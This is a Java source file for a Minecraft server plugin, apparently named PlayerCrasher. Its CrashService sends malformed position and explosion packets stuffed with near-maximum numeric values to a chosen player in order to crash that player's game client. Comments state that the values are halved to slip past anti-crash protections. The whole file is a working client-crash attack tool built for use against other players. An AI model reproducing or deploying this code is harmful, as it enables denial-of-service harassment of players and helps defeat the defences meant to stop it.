package com.deathmotion.playercrasher.services;

import com.deathmotion.playercrasher.enums.CrashMethod;
import com.github.retrooper.packetevents.PacketEvents;
import com.github.retrooper.packetevents.util.Vector3d;
import com.github.retrooper.packetevents.util.Vector3f;
import com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerExplosion;
import com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPlayerPositionAndLook;
import org.bukkit.entity.Player;

import java.util.Collections;
import java.util.HashMap;
import java.util.Map;
import java.util.function.Consumer;

/**
 * Service responsible for handling crashes.
 */
public class CrashService {
    private final WrapperPlayServerPlayerPositionAndLook positionPacket;
    private final WrapperPlayServerExplosion explosionPacket;
    private Map<CrashMethod, Consumer<Player>> crashMethodActions;

    /**
     * The constructor initializes the crash method actions and packets.
     */
    public CrashService() {
        this.initCrashMethodActions();

        this.positionPacket = initPositionPacket();
        this.explosionPacket = initExplosionPacket();
    }

    /**
     * Using half the MAX_VALUE helps to bypass some anti-crasher protections that flag maximum values as suspicious.
     *
     * @return half of maximum double value.
     */
    private static double d() {
        return Double.MAX_VALUE / 2;
    }

    /**
     * Using half the MAX_VALUE helps to bypass some anti-crasher protections that flag maximum values as suspicious.
     *
     * @return half of the maximum float value.
     */
    private static float f() {
        return Float.MAX_VALUE / 2;
    }

    /**
     * Using half the MAX_VALUE helps to bypass some anti-crasher protections that flag maximum values as suspicious.
     *
     * @return half of the maximum byte value.
     */
    private static byte b() {
        return Byte.MAX_VALUE / 2;
    }

    /**
     * Using half the MAX_VALUE helps to bypass some anti-crasher protections that flag maximum values as suspicious.
     *
     * @return half of the maximum integer value.
     */
    private static int i() {
        return Integer.MAX_VALUE / 2;
    }

    /**
     * Crashes the targeted player using the specified method.
     *
     * @param target the player to be crashed
     * @param method the crash method to be used
     */
    public void crashPlayer(Player target, CrashMethod method) {
        Consumer<Player> action = crashMethodActions.get(method);
        action.accept(target);
    }

    /**
     * Sends a position packet to the targeted player.
     *
     * @param target the player to receive the packet
     */
    private void sendPositionPacket(Player target) {
        PacketEvents.getAPI().getPlayerManager().sendPacket(target, positionPacket);
    }

    /**
     * Sends an explosion packet to the targeted player.
     *
     * @param target the player to receive the packet
     */
    private void sendExplosionPacket(Player target) {
        PacketEvents.getAPI().getPlayerManager().sendPacket(target, explosionPacket);
    }

    /**
     * Initializes actions for each crash method.
     */
    private void initCrashMethodActions() {
        this.crashMethodActions = new HashMap<>();
        this.crashMethodActions.put(CrashMethod.POSITION, this::sendPositionPacket);
        this.crashMethodActions.put(CrashMethod.EXPLOSION, this::sendExplosionPacket);
    }

    /**
     * @return a new PlayerPositionAndLook packet with maximum values.
     */
    private WrapperPlayServerPlayerPositionAndLook initPositionPacket() {
        return new WrapperPlayServerPlayerPositionAndLook(d(), d(), d(), f(), f(), b(), i(), false);
    }

    /**
     * @return a new Explosion packet with maximum values.
     */
    private WrapperPlayServerExplosion initExplosionPacket() {
        return new WrapperPlayServerExplosion(new Vector3d(d(), d(), d()), f(), Collections.emptyList(), new Vector3f(f(), f(), f()));
    }
}